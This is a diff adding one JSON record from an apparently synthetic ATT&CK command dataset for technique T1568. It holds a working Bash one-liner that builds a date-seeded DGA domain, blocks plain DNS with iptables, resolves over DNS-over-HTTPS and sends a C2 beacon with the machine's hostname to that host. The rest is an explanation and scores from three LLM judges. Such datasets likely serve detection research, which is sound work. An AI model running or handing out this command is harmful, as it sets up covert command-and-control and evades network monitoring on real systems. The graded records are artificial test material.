@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"alpha\"; LABEL=$(printf \"%s\" \"${SEED}$(date -u +%Y%m%d)\" | sha1sum | cut -c1-12); TLD=$(shuf -e com net org info -n1); FQDN=\"${LABEL}.cdn-update.${TLD}\"; PORT=$(shuf -e 8443 2053 4433 -n1); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; iptables -A OUTPUT -p udp --dport 53 -j DROP; curl --silent --show-error --fail --doh-url https://cloudflare-dns.com/dns-query --connect-timeout 3 --retry 2 --user-agent \"Mozilla/5.0 (healthcheck)\" \"https://${FQDN}:${PORT}/beacon?host=$(hostname)&ts=$(date +%s)\"",
+  "explanation": "Generates a time-based DGA domain, forces DNS over HTTPS for dynamic resolution, and beacons to an irregular TLS port while firewalling off standard DNS to evade monitoring.",
+  "rationale_steps": [
+    "Compute DGA domain label from a seed and current date",
+    "Randomly choose TLD and nonstandard TLS port",
+    "Tighten egress rules with iptables and suppress UDP/53",
+    "Resolve via DoH and perform C2 beacon using curl"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-7abe035f",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper variable assignments, command substitutions, balanced quotes, valid flags for all tools used (iptables, curl, date, etc.), and correct command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by generating a deterministic but time-based domain using SHA1 hashing, using DoH to bypass standard DNS monitoring, selecting random ports and TLDs for evasion, and implementing proper firewall rules to force the covert channel.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:28:46.254213Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, valid flags for all utilities, and correct use of command substitution and piping.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1568 by algorithmically generating domains, utilizing DoH for dynamic resolution, randomizing C2 ports, and implementing beaconing with well-designed evasion tactics despite the `iptables` commands requiring elevated privileges to execute successfully.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:29:00.717415Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and expansions with valid flags and separators across printf/sha1sum/cut, shuf, iptables, and curl, making the command parse cleanly.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements time-based DGA, uses DoH for resolution, and beacons to a randomized TLS port, but the iptables steps to block standard DNS require root and may not take effect.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:29:18.736566Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
